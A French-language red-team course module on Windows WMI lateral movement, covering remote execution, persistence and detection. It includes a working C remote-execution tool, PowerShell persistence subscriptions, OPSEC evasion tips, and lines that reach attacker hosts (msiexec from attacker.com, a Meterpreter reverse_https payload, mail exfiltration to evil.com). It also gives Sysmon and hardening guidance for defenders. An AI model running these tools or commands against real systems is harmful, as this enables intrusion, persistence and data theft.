# Module W68 : WMI Lateral Movement

## Objectifs du module

À la fin de ce module, vous serez capable de :

- Comprendre l'architecture WMI (Windows Management Instrumentation)
- Utiliser WMI pour l'exécution de code à distance
- Implémenter du Lateral Movement via WMI en C
- Créer des Event Subscriptions WMI pour la persistance
- Contourner les détections basiques via OPSEC
- Identifier les traces laissées par WMI dans les logs Windows

---

## 1. Introduction au WMI

### Qu'est-ce que WMI ?

**WMI (Windows Management Instrumentation)** est l'implémentation Microsoft du standard WBEM (Web-Based Enterprise Management) développé par le DMTF.

**Analogie** : Imaginez WMI comme un **panneau de contrôle universel** pour Windows. C'est comme avoir une télécommande qui peut interroger, configurer et contrôler n'importe quel composant du système : processus, services, fichiers, registre, réseau, etc.

```ascii
┌─────────────────────────────────────────────────────────┐
│                    ADMINISTRATEUR                        │
│              "Je veux lancer calc.exe"                   │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│                     WMI (Couche)                         │
│  ┌───────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │   Processes   │  │   Services   │  │   Registry   │ │
│  └───────────────┘  └──────────────┘  └──────────────┘ │
└─────────────────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│                  SYSTÈME D'EXPLOITATION                  │
│              (Exécution réelle de calc.exe)              │
└─────────────────────────────────────────────────────────┘
```

### Pourquoi WMI est puissant pour le Red Team ?

1. **Légitime** : Outil natif Windows, utilisé par les admins tous les jours
2. **Distant** : Peut interroger/contrôler des machines à distance via DCOM/RPC
3. **Furtif** : Pas de fichier écrit sur disque (exécution en mémoire possible)
4. **Polyvalent** : Gestion de processus, services, événements, persistance...
5. **Sous le radar** : Moins détecté que PsExec ou SMB direct

---

## 2. Architecture WMI

### 2.1 Les composants principaux

```ascii
┌────────────────────────────────────────────────────────────┐
│                       CLIENT (Attacker)                     │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Application (wmic.exe, script, code C)              │  │
│  └──────────────────┬───────────────────────────────────┘  │
│                     │                                       │
│  ┌──────────────────▼───────────────────────────────────┐  │
│  │         COM/DCOM (IWbemLocator)                      │  │
│  └──────────────────┬───────────────────────────────────┘  │
└─────────────────────┼──────────────────────────────────────┘
                      │
          ┌───────────▼──────────┐
          │   RPC (Port 135)     │
          │   + Dynamic Ports    │
          └───────────┬──────────┘
                      │ RÉSEAU
┌─────────────────────▼──────────────────────────────────────┐
│                    TARGET (Victim)                          │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │      WMI Service (Winmgmt) - svchost.exe             │  │
│  └──────────────────┬───────────────────────────────────┘  │
│                     │                                       │
│  ┌──────────────────▼───────────────────────────────────┐  │
│  │         CIM Repository (WMI Database)                │  │
│  │         %SYSTEMROOT%\System32\wbem\Repository\       │  │
│  └──────────────────┬───────────────────────────────────┘  │
│                     │                                       │
│  ┌──────────────────▼───────────────────────────────────┐  │
│  │    Providers (Win32_Process, Win32_Service...)       │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 Les namespaces WMI

WMI organise les classes en **namespaces** (espaces de noms), comme des dossiers.

```ascii
root
├── CIMV2              ← Le plus utilisé (Win32_Process, Win32_Service...)
├── SecurityCenter2    ← Antivirus, Firewall
├── Default            ← Événements WMI, persistance
├── Microsoft
│   └── Windows
│       └── Defender   ← Windows Defender
└── subscription       ← Event Subscriptions
```

**Namespace principal** : `root\CIMV2`

### 2.3 Les classes WMI importantes

| Classe              | Description                                    |
|---------------------|------------------------------------------------|
| `Win32_Process`     | Gestion des processus (Create, Terminate...)   |
| `Win32_Service`     | Gestion des services                           |
| `Win32_OperatingSystem` | Infos sur l'OS (version, architecture...)  |
| `Win32_ComputerSystem` | Infos matérielles (RAM, domaine...)         |
| `Win32_LoggedOnUser` | Utilisateurs connectés                        |
| `__EventFilter`     | Filtre d'événements (pour persistance)         |
| `__EventConsumer`   | Action à exécuter lors d'un événement          |

---

## 3. Accès distant WMI

### 3.1 Prérequis réseau

Pour accéder à WMI à distance, il faut :

1. **Port RPC** : TCP 135 (RPC Endpoint Mapper)
2. **Ports dynamiques** : TCP 49152-65535 (DCOM)
3. **Firewall** : Autorisation "Windows Management Instrumentation (WMI-In)"
4. **Credentials** : Compte avec privilèges admin local sur la cible

```ascii
ATTACKER                              TARGET
  (10.0.0.50)                        (10.0.0.100)
      │                                   │
      │ 1. Connexion RPC (port 135)       │
      ├───────────────────────────────────►│
      │                                   │
      │ 2. Négociation port DCOM          │
      │◄───────────────────────────────────┤
      │    "Utilise le port 49678"        │
      │                                   │
      │ 3. Communication DCOM (49678)     │
      ├───────────────────────────────────►│
      │    IWbemServices::ExecMethod()    │
      │                                   │
      │ 4. Exécution Win32_Process Create │
      │◄───────────────────────────────────┤
      │    "Process ID: 4521"             │
```

### 3.2 Authentification

WMI supporte plusieurs mécanismes :

- **NTLM** : Hash-based (Pass-the-Hash possible)
- **Kerberos** : Ticket-based
- **Negotiate** : Choisit automatiquement (Kerberos puis NTLM)

---

## 4. Exécution de code via WMI

### 4.1 Méthode Win32_Process::Create

C'est la technique la plus courante. La classe `Win32_Process` expose une méthode `Create()` qui lance un nouveau processus.

**Signature WMI** :

```wql
uint32 Create(
  [in]  string CommandLine,
  [in]  string CurrentDirectory,
  [in]  Win32_ProcessStartup ProcessStartupInformation,
  [out] uint32 ProcessId
);
```

**Schéma d'exécution** :

```ascii
┌──────────────┐
│   Attacker   │
└──────┬───────┘
       │
       │ IWbemServices::ExecMethod()
       │ Path: "Win32_Process"
       │ Method: "Create"
       │ CommandLine: "cmd.exe /c whoami > C:\output.txt"
       │
       ▼
┌──────────────────┐
│   WMI Service    │
└──────┬───────────┘
       │
       │ Appel Provider Win32_Process
       │
       ▼
┌──────────────────┐
│   Win32 API      │
│  CreateProcess() │
└──────┬───────────┘
       │
       ▼
┌──────────────────┐
│  cmd.exe spawned │
│  PID: 4521       │
└──────────────────┘
```

### 4.2 Exemple avec wmic.exe

```cmd
wmic /node:192.168.1.50 /user:DOMAIN\admin /password:P@ssw0rd ^
  process call create "cmd.exe /c whoami > C:\output.txt"
```

**Décomposition** :

- `/node:` → IP/hostname cible
- `/user:` → Compte avec droits admin
- `/password:` → Mot de passe (ou hash avec Pass-the-Hash)
- `process call create` → Appel méthode Create sur Win32_Process
- `"cmd.exe /c ..."` → Commande à exécuter

### 4.3 Avec PowerShell

```powershell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "calc.exe" `
  -ComputerName 192.168.1.50 `
  -Credential $cred
```

---

## 5. Implémentation en C avec COM

### 5.1 Architecture COM pour WMI

WMI utilise COM (Component Object Model) pour exposer ses interfaces.

```ascii
┌─────────────────────────────────────────────────────┐
│              Votre programme C                       │
└────────────────────┬────────────────────────────────┘
                     │
                     │ CoInitializeEx()
                     ▼
┌─────────────────────────────────────────────────────┐
│                  COM Runtime                         │
└────────────────────┬────────────────────────────────┘
                     │
                     │ CoCreateInstance()
                     ▼
┌─────────────────────────────────────────────────────┐
│              IWbemLocator (Interface)                │
│  Méthodes:                                           │
│    - ConnectServer() → Connexion à un namespace     │
└────────────────────┬────────────────────────────────┘
                     │
                     │ ConnectServer("\\target\root\cimv2")
                     ▼
┌─────────────────────────────────────────────────────┐
│            IWbemServices (Interface)                 │
│  Méthodes:                                           │
│    - ExecQuery() → Requêtes WQL                     │
│    - ExecMethod() → Exécution de méthodes           │
│    - GetObject() → Récupération d'objets            │
└─────────────────────────────────────────────────────┘
```

### 5.2 Code C complet : Remote Process Execution

```c
/*
 * WMI Lateral Movement - Remote Process Execution
 * Compile: cl wmi_lateral.c /link ole32.lib oleaut32.lib wbemuuid.lib
 */

#define _WIN32_DCOM
#include <windows.h>
#include <stdio.h>
#include <wbemidl.h>
#include <comdef.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// Fonction pour exécuter un processus distant via WMI
HRESULT WMIExecuteRemoteProcess(
    LPCWSTR target,
    LPCWSTR username,
    LPCWSTR password,
    LPCWSTR command
) {
    HRESULT hr;
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    IWbemClassObject *pClass = NULL;
    IWbemClassObject *pInParams = NULL;
    IWbemClassObject *pOutParams = NULL;
    IWbemClassObject *pInParamsInstance = NULL;

    // 1. Initialiser COM
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[!] Erreur CoInitializeEx: 0x%X\n", hr);
        return hr;
    }

    // 2. Définir le niveau de sécurité COM
    hr = CoInitializeSecurity(
        NULL,
        -1,                          // Authentification par défaut
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Niveau d'authentification
        RPC_C_IMP_LEVEL_IMPERSONATE, // Impersonation
        NULL,
        EOAC_NONE,
        NULL
    );

    if (FAILED(hr)) {
        printf("[!] Erreur CoInitializeSecurity: 0x%X\n", hr);
        CoUninitialize();
        return hr;
    }

    // 3. Créer IWbemLocator
    hr = CoCreateInstance(
        &CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        &IID_IWbemLocator,
        (LPVOID *)&pLoc
    );

    if (FAILED(hr)) {
        printf("[!] Erreur CoCreateInstance: 0x%X\n", hr);
        CoUninitialize();
        return hr;
    }

    printf("[+] IWbemLocator créé\n");

    // 4. Construire le chemin du namespace distant
    WCHAR namespacePath[256];
    swprintf(namespacePath, 256, L"\\\\%s\\root\\cimv2", target);

    // 5. Connexion au namespace WMI distant
    hr = pLoc->lpVtbl->ConnectServer(
        pLoc,
        namespacePath,
        (BSTR)username,
        (BSTR)password,
        NULL,
        0,
        NULL,
        NULL,
        &pSvc
    );

    if (FAILED(hr)) {
        printf("[!] Erreur ConnectServer: 0x%X\n", hr);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return hr;
    }

    printf("[+] Connecté à %S\n", namespacePath);

    // 6. Définir le niveau de sécurité du proxy
    hr = CoSetProxyBlanket(
        (IUnknown *)pSvc,
        RPC_C_AUTHN_WINNT,           // NTLM
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );

    if (FAILED(hr)) {
        printf("[!] Erreur CoSetProxyBlanket: 0x%X\n", hr);
        goto cleanup;
    }

    // 7. Récupérer la classe Win32_Process
    BSTR className = SysAllocString(L"Win32_Process");
    hr = pSvc->lpVtbl->GetObject(
        pSvc,
        className,
        0,
        NULL,
        &pClass,
        NULL
    );
    SysFreeString(className);

    if (FAILED(hr)) {
        printf("[!] Erreur GetObject Win32_Process: 0x%X\n", hr);
        goto cleanup;
    }

    printf("[+] Classe Win32_Process récupérée\n");

    // 8. Récupérer la signature de la méthode Create
    BSTR methodName = SysAllocString(L"Create");
    hr = pClass->lpVtbl->GetMethod(
        pClass,
        methodName,
        0,
        &pInParams,
        NULL
    );

    if (FAILED(hr)) {
        printf("[!] Erreur GetMethod Create: 0x%X\n", hr);
        SysFreeString(methodName);
        goto cleanup;
    }

    // 9. Créer une instance des paramètres d'entrée
    hr = pInParams->lpVtbl->SpawnInstance(pInParams, 0, &pInParamsInstance);
    if (FAILED(hr)) {
        printf("[!] Erreur SpawnInstance: 0x%X\n", hr);
        SysFreeString(methodName);
        goto cleanup;
    }

    // 10. Définir le paramètre CommandLine
    VARIANT varCommand;
    VariantInit(&varCommand);
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = SysAllocString(command);

    BSTR commandLineParam = SysAllocString(L"CommandLine");
    hr = pInParamsInstance->lpVtbl->Put(
        pInParamsInstance,
        commandLineParam,
        0,
        &varCommand,
        0
    );
    SysFreeString(commandLineParam);
    VariantClear(&varCommand);

    if (FAILED(hr)) {
        printf("[!] Erreur Put CommandLine: 0x%X\n", hr);
        SysFreeString(methodName);
        goto cleanup;
    }

    printf("[+] Paramètre CommandLine défini: %S\n", command);

    // 11. Exécuter la méthode Create
    BSTR objectPath = SysAllocString(L"Win32_Process");
    hr = pSvc->lpVtbl->ExecMethod(
        pSvc,
        objectPath,
        methodName,
        0,
        NULL,
        pInParamsInstance,
        &pOutParams,
        NULL
    );
    SysFreeString(objectPath);
    SysFreeString(methodName);

    if (FAILED(hr)) {
        printf("[!] Erreur ExecMethod: 0x%X\n", hr);
        goto cleanup;
    }

    // 12. Récupérer le PID du processus créé
    VARIANT varReturnValue;
    VARIANT varProcessId;
    VariantInit(&varReturnValue);
    VariantInit(&varProcessId);

    BSTR returnValueStr = SysAllocString(L"ReturnValue");
    BSTR processIdStr = SysAllocString(L"ProcessId");

    hr = pOutParams->lpVtbl->Get(pOutParams, returnValueStr, 0, &varReturnValue, NULL, 0);
    SysFreeString(returnValueStr);

    if (SUCCEEDED(hr) && varReturnValue.uintVal == 0) {
        hr = pOutParams->lpVtbl->Get(pOutParams, processIdStr, 0, &varProcessId, NULL, 0);
        if (SUCCEEDED(hr)) {
            printf("[+] Processus créé avec succès! PID: %u\n", varProcessId.uintVal);
        }
    } else {
        printf("[!] Échec de création du processus. Return code: %u\n", varReturnValue.uintVal);
    }

    SysFreeString(processIdStr);
    VariantClear(&varReturnValue);
    VariantClear(&varProcessId);

cleanup:
    if (pOutParams) pOutParams->lpVtbl->Release(pOutParams);
    if (pInParamsInstance) pInParamsInstance->lpVtbl->Release(pInParamsInstance);
    if (pInParams) pInParams->lpVtbl->Release(pInParams);
    if (pClass) pClass->lpVtbl->Release(pClass);
    if (pSvc) pSvc->lpVtbl->Release(pSvc);
    if (pLoc) pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    return hr;
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc != 5) {
        wprintf(L"Usage: %s <target> <username> <password> <command>\n", argv[0]);
        wprintf(L"Exemple: %s 192.168.1.50 DOMAIN\\admin P@ssw0rd \"cmd.exe /c whoami\"\n", argv[0]);
        return 1;
    }

    LPCWSTR target = argv[1];
    LPCWSTR username = argv[2];
    LPCWSTR password = argv[3];
    LPCWSTR command = argv[4];

    printf("=== WMI Remote Process Execution ===\n");
    printf("[*] Target: %S\n", target);
    printf("[*] User: %S\n", username);
    printf("[*] Command: %S\n", command);
    printf("\n");

    HRESULT hr = WMIExecuteRemoteProcess(target, username, password, command);

    if (SUCCEEDED(hr)) {
        printf("\n[+] Opération réussie!\n");
        return 0;
    } else {
        printf("\n[!] Opération échouée (0x%X)\n", hr);
        return 1;
    }
}
```

### 5.3 Compilation et exécution

```cmd
REM Compilation
cl wmi_lateral.c /link ole32.lib oleaut32.lib wbemuuid.lib

REM Exécution
wmi_lateral.exe 192.168.1.50 CORP\admin P@ssw0rd "cmd.exe /c whoami > C:\output.txt"
```

---

## 6. WMI Event Subscriptions pour la persistance

### 6.1 Concept

WMI permet de créer des **Event Subscriptions** : des règles qui exécutent du code lorsqu'un événement se produit.

**Composants** :

1. **Event Filter** : Définit l'événement déclencheur (ex: toutes les 60 secondes, au démarrage...)
2. **Event Consumer** : Action à exécuter (lancer un script, un exe...)
3. **Binding** : Lie le Filter au Consumer

```ascii
┌────────────────────────────────────────────────────────┐
│                    EVENT FILTER                         │
│  "Toutes les 5 minutes" ou "Au démarrage Windows"      │
└────────────────────┬───────────────────────────────────┘
                     │
                     │ Binding (__FilterToConsumerBinding)
                     ▼
┌────────────────────────────────────────────────────────┐
│                  EVENT CONSUMER                         │
│  CommandLineEventConsumer:                              │
│    "C:\Windows\System32\backdoor.exe"                   │
└────────────────────────────────────────────────────────┘
```

### 6.2 Exemple : Persistance au démarrage

#### Filter (déclencheur = démarrage système)

```sql
-- WQL Query
SELECT * FROM __InstanceModificationEvent WITHIN 60
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320
```

#### Consumer (action = lancer payload)

```sql
-- CommandLineEventConsumer
CommandLineTemplate: C:\Windows\Temp\payload.exe
```

#### Création via PowerShell

```powershell
# 1. Créer le Filter
$FilterArgs = @{
    Name = 'BootTrigger'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# 2. Créer le Consumer
$ConsumerArgs = @{
    Name = 'BootPayload'
    CommandLineTemplate = 'C:\Windows\Temp\payload.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# 3. Créer le Binding
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### 6.3 Types de Consumers

| Type                       | Description                                    |
|----------------------------|------------------------------------------------|
| `CommandLineEventConsumer` | Exécute une commande                           |
| `ActiveScriptEventConsumer`| Exécute du VBScript/JScript                    |
| `LogFileEventConsumer`     | Écrit dans un fichier log                      |
| `NTEventLogEventConsumer`  | Écrit dans l'Event Log Windows                 |
| `SMTPEventConsumer`        | Envoie un email                                |

---

## 7. Outils WMI natifs

### 7.1 wmic.exe (Ligne de commande)

**Exemples pratiques** :

```cmd
REM Lister les processus distants
wmic /node:192.168.1.50 /user:admin /password:P@ss process list brief

REM Obtenir info OS
wmic /node:192.168.1.50 /user:admin /password:P@ss os get caption,version

REM Tuer un processus distant
wmic /node:192.168.1.50 /user:admin /password:P@ss process where "name='notepad.exe'" call terminate

REM Créer un service distant
wmic /node:192.168.1.50 /user:admin /password:P@ss service create MyService binpath="C:\backdoor.exe"
```

### 7.2 wbemtest.exe (GUI pour tester WMI)

**wbemtest** est un outil graphique Microsoft pour tester les requêtes WMI.

**Procédure** :

1. Lancer `wbemtest.exe`
2. Cliquer **Connect**
3. Entrer le namespace : `\\192.168.1.50\root\cimv2`
4. Entrer credentials si distant
5. Cliquer **Query** et entrer : `SELECT * FROM Win32_Process`
6. Voir les résultats

```ascii
┌─────────────────────────────────────────┐
│          Windows WMI Tester             │
├─────────────────────────────────────────┤
│  Namespace: \\target\root\cimv2         │
│                                         │
│  [Connect]  [Query]  [Execute Method]   │
│                                         │
│  Query: SELECT * FROM Win32_Process     │
│                                         │
│  Results:                               │
│    - explorer.exe (PID: 1234)           │
│    - svchost.exe (PID: 5678)            │
│    - ...                                │
└─────────────────────────────────────────┘
```

### 7.3 winrs + winrm (WS-Management)

WinRM utilise aussi WMI en backend, mais via HTTP/HTTPS.

```cmd
winrs -r:192.168.1.50 -u:admin -p:P@ss cmd
```

---

## 8. Requêtes WQL (WMI Query Language)

WQL est un sous-ensemble de SQL pour interroger WMI.

### Syntaxe de base

```sql
SELECT <propriétés> FROM <classe> WHERE <condition>
```

### Exemples

```sql
-- Tous les processus
SELECT * FROM Win32_Process

-- Processus par nom
SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'

-- Services arrêtés
SELECT * FROM Win32_Service WHERE State = 'Stopped'

-- Utilisateurs avec SID
SELECT * FROM Win32_UserAccount WHERE SID LIKE 'S-1-5-21-%'

-- Disques avec espace > 10 Go
SELECT * FROM Win32_LogicalDisk WHERE FreeSpace > 10737418240
```

---

## 9. OPSEC et détection

### 9.1 Traces laissées par WMI

| Trace                          | Emplacement                                      |
|--------------------------------|--------------------------------------------------|
| **Event Logs**                 | `Microsoft-Windows-WMI-Activity/Operational`     |
| **Réseau**                     | Trafic RPC (port 135 + dynamiques)              |
| **Processus parent suspect**   | Process créé avec parent `WmiPrvSE.exe`          |
| **Event Subscriptions**        | Persistent dans `root\subscription`              |
| **Repository**                 | `C:\Windows\System32\wbem\Repository\`           |

### 9.2 Event IDs critiques

| Event ID | Description                                      |
|----------|--------------------------------------------------|
| **5857** | WMI Activity (requête exécutée)                  |
| **5858** | Erreur WMI                                       |
| **5860** | Permanent Event Consumer créé                    |
| **5861** | Permanent Event Consumer supprimé                |

### 9.3 Détection via Sysmon

**Sysmon Event ID 19, 20, 21** : WMI Event Monitoring

```xml
<RuleGroup name="WMI" groupRelation="or">
  <WmiEvent onmatch="include">
    <Operation>Created</Operation>
  </WmiEvent>
</RuleGroup>
```

**Exemple de log Sysmon** :

```
Event ID: 19 (WmiEventFilter activity detected)
EventNamespace: root\subscription
Name: BootTrigger
Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE...
```

### 9.4 Techniques OPSEC

#### A. Limiter les traces réseau

- Utiliser des connexions déjà établies (session réutilisation)
- Proxychains via SOCKS
- Utiliser WinRM (HTTPS) au lieu de DCOM direct

#### B. Nettoyer les Event Subscriptions

```powershell
# Lister les Event Subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Supprimer
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='BootTrigger'" | Remove-WmiObject
```

#### C. Éviter les commandes suspectes

Au lieu de :

```cmd
cmd.exe /c powershell -enc <base64>
```

Utiliser :

```cmd
C:\Windows\System32\msiexec.exe /q /i http://attacker.com/payload.msi
```

#### D. Utiliser des Process Spoofing

Injecter du code dans un processus légitime plutôt que spawner un nouveau processus.

---

## 10. Défense contre WMI Lateral Movement

### 10.1 Hardening

```powershell
# Désactiver WMI distant (si pas nécessaire)
Set-Service -Name Winmgmt -StartupType Disabled

# Firewall : bloquer port 135
New-NetFirewallRule -DisplayName "Block RPC" -Direction Inbound -Protocol TCP -LocalPort 135 -Action Block

# Restreindre les permissions WMI
# Ouvrir wmimgmt.msc → Sécurité → Limiter Remote Enable
```

### 10.2 Monitoring

**Détection temps réel avec PowerShell** :

```powershell
# Surveiller les Event Subscriptions créées
Register-WmiEvent -Namespace root\subscription -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA '__EventFilter'" -Action {
    Write-Host "[ALERT] Nouveau Event Filter créé!"
    $event.SourceEventArgs.NewEvent.TargetInstance | Format-List
}
```

### 10.3 Outils de détection

- **Sysmon** : Event ID 19, 20, 21
- **Windows Defender ATP** : Détection des patterns WMI suspects
- **Autoruns (Sysinternals)** : Onglet WMI pour voir les Event Subscriptions
- **WMI-IDS** : Scripts GitHub pour détecter les abus WMI

---

## 11. Comparaison avec autres techniques de Lateral Movement

| Technique       | Protocole  | Port(s)      | Traces disque | Furtivité | Détection |
|-----------------|------------|--------------|---------------|-----------|-----------|
| **PsExec**      | SMB        | 445          | Haute (exe)   | Faible    | Élevée    |
| **WMI**         | RPC/DCOM   | 135+dynamic  | Faible        | Moyenne   | Moyenne   |
| **WinRM**       | HTTP/HTTPS | 5985/5986    | Faible        | Moyenne   | Moyenne   |
| **DCOM**        | RPC        | 135+dynamic  | Faible        | Haute     | Faible    |
| **Pass-the-Hash + SMB** | SMB | 445      | Moyenne       | Faible    | Élevée    |

**WMI est un bon compromis** : moins bruyant que PsExec, mais plus flexible que DCOM pur.

---

## 12. Exemples pratiques Red Team

### 12.1 Scénario : Exfiltration via WMI

```powershell
# Encoder le fichier en base64
$fileContent = Get-Content C:\sensitive.txt -Raw
$bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$base64 = [Convert]::ToBase64String($bytes)

# Envoyer via WMI Event Subscription (consumer = HTTP request)
# (nécessite un consumer custom ou utiliser CommandLineEventConsumer avec curl.exe)
```

### 12.2 Scénario : Credential Harvesting

```powershell
# Créer un Event Filter pour capturer les logins
$Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"

# Consumer : Envoyer les infos à l'attaquant
$Command = "powershell -c \"Send-MailMessage -To attacker@evil.com -Subject 'New Login' -Body (Get-WmiObject Win32_LoggedOnUser)\""
```

### 12.3 Scénario : Pivoting avec WMI + Meterpreter

```bash
# Générer payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe -o payload.exe

# Uploader via SMB
smbclient //target/C$ -U admin
put payload.exe

# Exécuter via WMI
wmic /node:target /user:admin /password:P@ss process call create "C:\payload.exe"
```

---

## 13. Checklist Red Team

### Avant l'attaque

- [ ] Confirmer que WMI est activé sur la cible (scan port 135)
- [ ] Obtenir credentials valides (admin local)
- [ ] Vérifier firewall rules (port 135 + dynamic)
- [ ] Préparer payload (si nécessaire)
- [ ] Tester en lab avant production

### Pendant l'attaque

- [ ] Utiliser des credentials légitimes (éviter spray)
- [ ] Minimiser le nombre de connexions
- [ ] Utiliser des commandes natives Windows (LOLBins)
- [ ] Éviter les payloads avec signatures connues
- [ ] Nettoyer les Event Subscriptions après usage

### Après l'attaque

- [ ] Supprimer les Event Subscriptions créées
- [ ] Vérifier les logs WMI (Event ID 5860)
- [ ] Supprimer les payloads uploadés
- [ ] Documenter les IoCs pour le rapport

---

## 14. Exercices pratiques

### Exercice 1 : Reconnaissance WMI

**Objectif** : Utiliser WMI pour énumérer un système distant.

**Instructions** :

1. Utiliser `wmic` pour lister les processus sur `192.168.1.50`
2. Récupérer la version de l'OS
3. Lister les utilisateurs locaux
4. Identifier les services en cours

**Commandes** :

```cmd
wmic /node:192.168.1.50 /user:admin /password:P@ss process list brief
wmic /node:192.168.1.50 /user:admin /password:P@ss os get caption,version
wmic /node:192.168.1.50 /user:admin /password:P@ss useraccount list brief
wmic /node:192.168.1.50 /user:admin /password:P@ss service where state='running' get name,pathname
```

### Exercice 2 : Exécution de code distant

**Objectif** : Exécuter `calc.exe` sur une machine distante.

**Instructions** :

1. Compiler le code C fourni dans ce cours
2. Exécuter contre une machine lab : `wmi_lateral.exe 192.168.1.50 admin P@ss "calc.exe"`
3. Vérifier via Task Manager distant que calc.exe est lancé

### Exercice 3 : Persistance WMI

**Objectif** : Créer une Event Subscription pour la persistance.

**Instructions** :

1. Créer un Event Filter qui se déclenche toutes les 10 minutes
2. Créer un Consumer qui lance `notepad.exe`
3. Créer le Binding
4. Vérifier avec `autoruns.exe` ou PowerShell que la subscription existe
5. Nettoyer après test

### Exercice 4 : Détection

**Objectif** : Détecter une attaque WMI.

**Instructions** :

1. Configurer Sysmon avec WMI monitoring (Event ID 19, 20, 21)
2. Créer une Event Subscription test
3. Analyser les logs Sysmon
4. Identifier les IoCs (nom du filter, query WQL, consumer...)

---

## 15. Ressources complémentaires

### Documentation Microsoft

- [WMI Reference](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
- [Win32_Process Class](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process)
- [WQL (WMI Query Language)](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi)

### Articles techniques

- [MITRE ATT&CK - T1047 Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
- [FireEye - WMI Offense, Defense, and Forensics](https://www.fireeye.com/blog/threat-research/2017/03/wmi_persistence.html)
- [Cybereason - WMI Lateral Movement](https://www.cybereason.com/blog/wmi-lateral-movement-detection)

### Outils

- **WMImplant** : Framework WMI pour Red Team (GitHub)
- **WMIcmd** : Shell interactif via WMI
- **SharpWMI** : Implémentation C# pour WMI lateral movement
- **Invoke-WMIMethod** : Module PowerShell

### Labs

- **HackTheBox** : Machines Windows avec WMI activé
- **TryHackMe** : Room "Lateral Movement"
- **GOAD** : Active Directory lab avec WMI configuré

---

## 16. Synthèse

### Points clés à retenir

1. **WMI = Panneau de contrôle universel Windows**
   - Gestion de processus, services, événements, etc.
   - Accessible localement ET à distance

2. **Lateral Movement via WMI**
   - Méthode `Win32_Process::Create()` pour exécuter du code
   - Protocole RPC/DCOM (port 135 + dynamiques)
   - Credentials admin local requis

3. **Implémentation en C**
   - COM : `CoInitializeEx()` → `IWbemLocator` → `IWbemServices`
   - `ExecMethod()` pour appeler `Create()`
   - Gestion HRESULT et release des interfaces

4. **Persistance avec Event Subscriptions**
   - Filter (déclencheur) + Consumer (action) + Binding
   - Survit aux redémarrages
   - Détectable via Sysmon Event ID 19/20/21

5. **OPSEC**
   - Minimiser les traces réseau et Event Log
   - Nettoyer les subscriptions après usage
   - Utiliser des commandes natives (LOLBins)

6. **Détection**
   - Event Logs : `Microsoft-Windows-WMI-Activity/Operational`
   - Sysmon : Event ID 19, 20, 21
   - Process parent = `WmiPrvSE.exe` suspect

---

## Conclusion

WMI est un outil extrêmement puissant pour le Lateral Movement en environnement Windows. Sa légitimité en tant qu'outil d'administration le rend difficile à bloquer complètement, mais il laisse des traces exploitables pour la détection.

**En tant que Red Teamer** : WMI doit faire partie de votre arsenal, mais utilisez-le avec prudence et en combinaison avec d'autres techniques pour éviter la détection.

**En tant que Blue Teamer** : Surveillez les Event Subscriptions, les connexions RPC distantes, et les processus enfants de `WmiPrvSE.exe`.

**Prochaines étapes** : Pratiquez dans un lab, combinez avec Pass-the-Hash, explorez DCOM direct pour encore plus de furtivité.

---

**Fin du Module W68 - WMI Lateral Movement**
